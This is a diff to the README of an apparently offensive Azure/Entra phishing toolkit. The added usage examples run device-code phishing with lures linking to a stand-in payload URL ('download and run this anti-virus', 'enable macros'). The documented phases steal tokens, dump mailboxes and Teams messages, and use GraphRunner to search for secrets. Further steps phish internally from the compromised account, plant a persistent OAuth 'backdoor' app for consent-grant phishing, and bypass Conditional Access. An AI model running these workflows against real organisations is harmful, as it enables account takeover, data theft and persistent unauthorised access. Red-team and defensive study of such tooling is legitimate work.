@@ -26,6 +26,9 @@ WARNING: When you get your first bite, SAVE THAT TOKEN LOG. Get the users tokens
 .\ClearLoot.ps1
 ```
 
+### Modules
+It's modular, azurehound is one, AADInternals recon, AzureAD enumeration, etc. Recon.ps1, azuread.ps1, azurehound.ps1 are standalones that take access tokens or whatever params needed to do the thing. You can easily rip these out and use them in your own madness, if you want. I tried to make things as flexible as possible. Once you've mapped the tenant, performed recon and built your new lists you may as well as just use it for additional phishing and omit those switches. 
+
 ### Examples
 
 #### Install requirements, perform all recon using azuread, AADInternals, and Azurehound modules, attempt to use payroll account to phish a particular accountant
@@ -39,7 +42,7 @@ $template = "adobe" # or chatgpt, bluebeam, bbb, one of the secret ones
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -azurehound -recon -azuread -install
 ```
 
-#### With Azurehound and No Installation, phish a PM to phish IT for installation of required software
+#### With Azurehound and No Installation, phish a user to phish IT for installation of required software
 ```powershell
 $targetUser = "helpdesk@corpomax.com"
 $firstUser = "MaxBedroom@corpomax.com"
@@ -63,8 +66,32 @@ $template = "chatgpt"
 .\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template
 ```
 
-### Modules
-It's modular, azurehound is one, AADInternals recon, AzureAD enumeration, etc. Recon.ps1, azuread.ps1, azurehound.ps1 are standalones that take access tokens or whatever params needed to do the thing. You can easily rip these out and use them in your own madness, if you want. I tried to make things as flexible as possible. Once you've mapped the tenant, performed recon and built your new lists you may as well as just use it for additional phishing and omit those switches. 
+#### GraphRecon
+Import GraphRunner, convert the tokens and run Invoke-GraphRunner to dump tenant info and search users mailbox, Teams and Sharepoint for defualt_detectors.json values
+
+```powershell
+$targetUser = "p.atreides@duneman.com"
+$firstUser = "chani@gmail.com"
+$messageContent = "At night fall, the spice harvesters land. The outsiders race against time to avoid the heat of the day. They ravage our land in front of our eyes. Their cruelty to my people is all I've known. These outsiders, the Harkonnens, came long before I was born. By controlling spice production, they became obscenely rich. Richer than the Emperor himself. Your computer is infected. Please download and run this anti-virus program to secure your PC https://virustime.azurewebsites.net"
+$subject = "Change Order Requested: Arrakis Square"
+$template = "bbb"
+
+.\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -install -GraphRecon
+```
+
+#### Persistence
+Inject an OAuth App Registration and capture the credentials. Uses the GraphRunner Invoke-InjectOAuthApp function and supports Invoke-AutoOAuthFlow to complete the Consent Grant flow and assign permissions to the App. This URL cna also be used for Consent Grant phishing and all the information you need is in the PeristenceApps.log file. 
+
+```powershell
+$targetUser = "p.atreides@duneman.com"
+$firstUser = "chani@gmail.com"
+$messageContent = " This crysknife was given to me by my great aunt. Its made from a tooth of Shai Hulud, the great sandworm. This will be a great honor for you to die holding it. Please click here and enable macros when prompted https://virustime.azurewebsites.net"
+$subject = "Urgent!!!"
+$template = "fondo"
+
+.\wrapper.ps1 -targetUser $targetUser -firstUser $firstUser -messageContent $messageContent -subject $subject -template $template -install -persistence -ReplyUrl "http://localhost:10000" -AppName "Spiceworks kekeke" -Scope "op backdoor"
+```
+
 
 ### Templates
 Adding a template to this is really easy. Look at the ones here and Replace.ps1, you can see we're looking for and replacing '(((VERIFICATION)))' in the html body. This is the device code that gets generated. If you place one in a new template and add a couple lines of code to Replace.ps1 and Next.ps1 you can use your own.
@@ -94,7 +121,7 @@ switch ($template) {
 }
 ```
 
-### Phase 1 - Recon
+### Phase 1 - Recon and Persistence
 If modules are specified, once you receive an access token, the script will automatically perform requested recon of tenant, user and groups using AADInternals or Azurehound. Can generate a list of users with detailed information (SIDs, valid sessions, phone number, identities) is exported and useable user list for the spreader function is generated. Groups, users, internal recon, etc output to json in the same directory as the script.
 
 ![image](https://github.com/MelloSec/PhirstPhish/assets/65114647/01e9fd43-b20f-48c2-a8b3-9fdc1b5ae6ad)
@@ -105,14 +132,16 @@ Using the latest version of Azurehound for your platform, the Azure tenant will 
 
 ![image](https://github.com/MelloSec/PhirstPhish/assets/65114647/ec598ff5-e82d-4a36-acfb-f887e9b18b55)
 
+An OAuth application with the most permissions a user can approve without being an admin can be created using -Scope "op backdoor", this App can also be used for internal Consent Grant phishing attacks.
 
-### Phase 2 - Loot
+
+### Phase 2 - Loot 
 It will dump the compromised users last 200 emails from their inbox and all their teams messages by default. Optional modules include azureHound, azureAd and Recon. If the azureAd module is used, a user list is generated for further phishing attacks, as well as groups. if the recon module is used, AADInternals authenticated recon modules will run.  
 
 <b><u>WARNING:</u></b> Just to re-iterate that last bit.. this will export a lot of sensitive information to the folder you run this from, as that is it's intended purpose. Please clean up your workspace / don't commit the loot to main 
 
 
-### Phase 3 - Spread
+### Phase 3 - Internal Phishing
 Specifying "-targetUser" and "-messageContent" will let you pass an email address and phishing pretext to use the compromised account as an internal relay and attempt to move laterally or capitalize on a trusted relationship with an external third party.
 
 
@@ -120,7 +149,6 @@ Specifying "-targetUser" and "-messageContent" will let you pass an email addres
 Scripts\RoadTools.ps1 - proof of concept that uses TokenTactics to generate a token for RoadTools which will gather conditional access policy info and register a device that could bypass Conditonal Access. As is, play with it, make it your own.
 
 V2 - Included the V2 fork of TokenTactics in the repo, just so you know it exists. It has additional features but at the time I made this tool they weren't playing nice and it wasn't worth trying to make it work. I think that's mostly fixed, if you want to try this script with V2, modify PhirstPhish.ps1 and insert the URL to the V2 repo https://github.com/f-bader/TokenTacticsV2 and try it? Shouldn't take much to make that work, but will give you access to the extended Continus Access Evaluation tokens, if ya nasty: https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-continuous-access-evaluation
-
 
 
 
